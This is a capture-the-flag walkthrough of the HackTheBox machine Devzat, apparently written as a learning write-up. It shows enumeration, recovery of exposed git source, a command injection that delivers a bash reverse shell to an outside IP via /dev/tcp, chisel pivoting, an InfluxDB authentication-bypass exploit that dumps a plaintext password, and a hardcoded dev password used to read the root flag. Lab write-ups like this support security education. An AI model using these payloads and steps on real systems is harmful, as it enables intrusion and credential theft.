# Devzat - HackTheBox Walkthrough 
![Devzat jpeg](https://user-images.githubusercontent.com/104053455/177004715-3724516a-d19a-47b1-ab9a-29e7c46eefe9.jpg)
# CONTENT :
1. Connecting to HTB machine
2. Nmap scanning
3. Adding to localhost
4. Fuff scanning
5. Git source code enumeration
6. Using Wireshark
7. Getting reverse shell
8. Using burpsuite
9. Pivoting
10. InfluxDB exploitation
11. Switching to Catherine
12. Root flag captured

### 1. CONNECTING TO HTB [via VPN]:</br>
First of all, we need to connect to the HTB machine using a VPN that is downloaded from HTB.</br>
My VPN:lab_dracula2001.ovpn</br>
command: *Openvpn lab_dracula2001.ovpn* [command used to connect the VPN]

Machine IP *10.10.11.118*

![devzat 1](https://user-images.githubusercontent.com/104053455/177005141-4c937af2-9932-45ee-9182-38796e894d08.jpg)

### 2. Nmap Scanning [ for open ports]:</br>
Nmap tool is used to scan the open ports.</br>
commands: *nmap -sC -sV -A -Pn 10.10.11.118*

![nmap](https://user-images.githubusercontent.com/104053455/177005422-82a8cbcd-9808-4126-b88f-879e008f5141.jpg)

Nmap scan result: *Port 22, Port 80, Port 8000,* apache service is running on port 80, so here we get to know that there is a webpage running.

### 3. Adding to localhost :
But here we need to add this to our local host otherwise we can't view the website.</br>
Command: *nano /etc/hosts* [ this is used to add hosts]

![localhost](https://user-images.githubusercontent.com/104053455/177005568-006a10b0-36f9-489d-98b4-994535ee6549.jpg)

After setting up localhost we will be able to view the website.

![website](https://user-images.githubusercontent.com/104053455/177005620-0642f257-2592-4589-a9eb-a7f72d4839c5.jpg)

## Gobuster scanning:</br>
I tried using gobuster scan and didn't get the result , so just move on to vhost scanning using **ffuf**</br>
command : *gobuster dir -u http://10.10.11.118:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium* [gobuster dir - u (URL of website) - w (wordlist)]

![gobuster](https://user-images.githubusercontent.com/104053455/177005800-8c64c757-147c-4063-b390-5054c1b2565c.png)

### 4. Fuff scanning :
command:*fuff - w /usr/share/seclists/Discovery/DNS/subdomains-topmillion- 5000.txt -mc 200 -c -u https://devzat.htb/ -H "HOST: FUZZ.devzat.htb"*</br>
After scanning, we get to know that vhost pets (website) and need to add this to the localhost file.

![hosts](https://user-images.githubusercontent.com/104053455/177005838-c1004173-7e14-4a0a-b257-4f2e6d447a59.jpg)

scanning web directory *pets.devzat.htb*:</br>
Command : *ffuf -u http: //pets.devzat.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content-raft-small- words.txt -fs 510*

### 5. Git source code enumeration :</br>
Here we needed to go through each directory to find the git file and download it.</br>
Command : *wget -r -np -R "index.html*" http://pets.devzat.htb/.git</br> and filename is *pets.devzat.htb*

![git downlad](https://user-images.githubusercontent.com/104053455/177006070-9f62b5a3-ebb1-4c55-b040-79fe29d8fe5e.jpg)

After downloading, go through the directories and check for the git status using the command *git status* :

![git status](https://user-images.githubusercontent.com/104053455/177006099-0ac7cabf-a771-48d4-bc64-065437429909.jpg)

And here many files have been deleted, so we need to restore them.</br> the command used to restore: *git restore .*

![git restore](https://user-images.githubusercontent.com/104053455/177006138-8b835bcc-7634-462b-9a64-96f1995db5a5.jpg)

Here let's go through the file called main.go </br>
command : *cat main.go* [ command used to view the content inside the file]

![main go](https://user-images.githubusercontent.com/104053455/177006193-bfaa30b4-b11b-4010-afc6-33356652c225.jpg)
![main go2](https://user-images.githubusercontent.com/104053455/177006228-7d2a67d3-970f-4bc6-a918-d87689fbe3f6.jpg)

After going through the file, we get to know that the website pets.devzat.htb has command injection vulnerable [ command injection is possible in species]

### 6. Using Wireshark :</br>
Wireshark result to show vulnerable by capturing the icmp echos

![wireshark](https://user-images.githubusercontent.com/104053455/177006279-10bcf756-598f-414e-b22f-d40083e0c054.png)

### 7. Getting reverse shell :</br>
For gaining access to reverse shell, we need to make a payload using the following command.</br>
Command : *echo -n 'bash -I>&/dev/tcp/10.10.14.84/9001 0>&1' | base64*

![geting rev](https://user-images.githubusercontent.com/104053455/177006330-5cf29430-a679-4c2a-98d1-a4c758602c39.jpg)

### 8. Using Burpsuite:</br>
Now using the burpsuite to intercept the web request.

![burp1](https://user-images.githubusercontent.com/104053455/177006365-7bd7fe0a-ef4e-42ca-9fd9-919d833717e5.jpg)

To intercept the web request, we need to turn on the *"intercept is on "* in proxy option, on the burpsuite application. After that go to the website and turn on proxy.

![proxy](https://user-images.githubusercontent.com/104053455/177006469-18d3570e-e7a2-4aef-92b3-9afe7a0ae87a.jpg)

![burp2](https://user-images.githubusercontent.com/104053455/177006488-10e6bdd6-9e23-4f88-8571-6177371825ba.png)

Here we got intercepting result and place the payload in species section as shown below :

![brup innter](https://user-images.githubusercontent.com/104053455/177006526-a8de6e84-36cd-4e0d-a65b-93de144f59fb.png)

After adding payload start-up the listner.</br>
Command : *nc -lnvp 9001*

![nc lv](https://user-images.githubusercontent.com/104053455/177006551-1835581b-aa5e-4b30-b6b0-6794eb812886.png)

Now we got the reverse shell access. After getting reverse shell, checks for the system id which shows the results as :</br>
Command: *id*

![id command](https://user-images.githubusercontent.com/104053455/177006592-ec80ef01-040d-4377-ae64-78435f420c34.png)

### 9. Pivoting :</br>
Here we use chisel tool to port forward back to the attackers machine.chisel is downloaded and configured from Github to our machine and then it is transferred to devzat by using python server.

![pvoit 1](https://user-images.githubusercontent.com/104053455/177006644-e0afc2a2-dac4-4a5c-b61f-56148b683577.png)
![pvoit 2](https://user-images.githubusercontent.com/104053455/177006669-7182305f-e3e5-4002-9a66-7e1a9a4561ff.png)

Chisel on devtaz machine:

![pvoit 3](https://user-images.githubusercontent.com/104053455/177006694-03331066-6acb-4aa9-b30c-9c2627630105.png)

After port forwarding, we have to run a nmap scan.</br>

Command : *nmap -p 8086 -sV 127.0.0.1*

![influx](https://user-images.githubusercontent.com/104053455/177006746-265861f8-20d2-4443-a88a-edcc557e1309.png)

### 10. InfluxDB exploitation:</br>
After doing nmap scan we get to know that influxDb service is running on port 8086, so now we have to search for it exploits.</br>

URL of github (exploit) : *https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE- 2019–20933*</br>

Command : *git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE- 2019–20933*

Download it and give permission</br>

Command : *chmod +x__ main__.py </br>
          pip install -r requirements.txt*
          
![install pip req](https://user-images.githubusercontent.com/104053455/177007137-5e13c210-ba41-4817-aeb2-7b89deda2ef0.png)

After doing these steps start the influxDB exploit.</br>

Command: *python3___main__.py*

![main py](https://user-images.githubusercontent.com/104053455/177007191-777f19c7-44b3-4a05-87aa-61bf98ab0316.png)

List the table using.</br>

Command: *SHOW MEASUREMENTS*

![main 2 py](https://user-images.githubusercontent.com/104053455/177007235-66cb8982-24bd-42a7-bc1a-47e2ae8f4ab0.png)

After that dump user.</br>

Command: *select *from "user"*

![passw](https://user-images.githubusercontent.com/104053455/177007442-1deb4f81-2805-4b8e-a402-4f8e217f719b.png)

User: *catherine*</br>
Password: *woBeeYareedahc7Oogeephies7Aiseci*

Now we got the password of Catherine's user, so we can log in as Catherine's user.</br>

### 11. Switching to Catherine user :</br>

Command: *su Catherine</br>

           cat user.txt* [ to view the user flag]

![cat](https://user-images.githubusercontent.com/104053455/177007525-af3f2038-0a0e-4fac-a571-ffafc60ddaa0.png)

User flag:

![flag](https://user-images.githubusercontent.com/104053455/177007541-cae4666c-d7bc-4114-8e83-dc2a46425c24.png)

Here we got a zip files named devzat-dev.zip and devzat-main.zip so we need to unzip it into /tmp directory</br>

Command : *cp devzat-dev.zip /tmp*

![dev](https://user-images.githubusercontent.com/104053455/177007568-3dae6759-3092-4108-86bb-d2eb224b4008.png)

From the diff command, the *"dev"* environment implements the file reading function using the file command with password protection. The "dev" environment is running on localhost *port 8443,* hence from the initial enumeration using Patrick account unable to check the process running *8443*.</br>

Command: *diff dev/commands.go main/commands.go*

![diff](https://user-images.githubusercontent.com/104053455/177007615-6850acc0-561e-4a02-a749-340bfc85fa64.png)

Now, need to download chisel in Catherine user for port forwarding

![chisel in cat](https://user-images.githubusercontent.com/104053455/177007649-30e0bd4b-79c4-41a6-9b20-afb39da699de.png)

after downloading we need to give permission to chisel file.</br>

Command : *chmod +x chisel_1.7.3_linux_amd64*

![chmod](https://user-images.githubusercontent.com/104053455/177007678-1d61b104-77fe-40a7-9da3-c8920fcd2655.png)

Now we need to do port forwarding from here to our own machine by using the tool we previously used (chisel) and ssh port will be *8443*.

![chisel port](https://user-images.githubusercontent.com/104053455/177007782-c74e2caf-a86e-4135-9ad1-ac9820364095.png)

Command : *ssh -l test 127.0.0.1 -p 8443*

![ssh](https://user-images.githubusercontent.com/104053455/177007800-fe813c7e-4b2a-4958-88fe-6f43fe9053d4.png)

###12. Root flag capturing:
Command : */file ../root.txt CeilingCatStillAThingin2021?*

# Finally, the system is PWNED !!



